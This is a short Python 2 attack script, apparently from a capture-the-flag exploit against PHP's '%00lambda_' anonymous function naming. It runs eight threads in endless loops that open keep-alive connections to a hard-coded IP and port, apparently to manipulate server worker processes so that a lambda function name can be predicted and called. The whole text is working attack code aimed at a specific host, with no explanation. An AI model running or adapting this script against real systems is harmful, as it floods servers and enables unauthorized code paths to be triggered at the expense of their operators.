# coding: UTF-8
# Author: orange@chroot.org
# /?func_name=%00lambda_1

import requests
import socket
import time
from multiprocessing.dummy import Pool as ThreadPool
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass


def run(i):
    while 1:
        HOST = '123.206.86.208'
        PORT = 25252
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall(
            'GET / HTTP/1.1\nHost: 123.206.86.208\nConnection: Keep-Alive\n\n')
        # s.close()
        print 'ok'
        time.sleep(0.5)


i = 8
pool = ThreadPool(i)
result = pool.map_async(run, range(i)).get(0xffff)
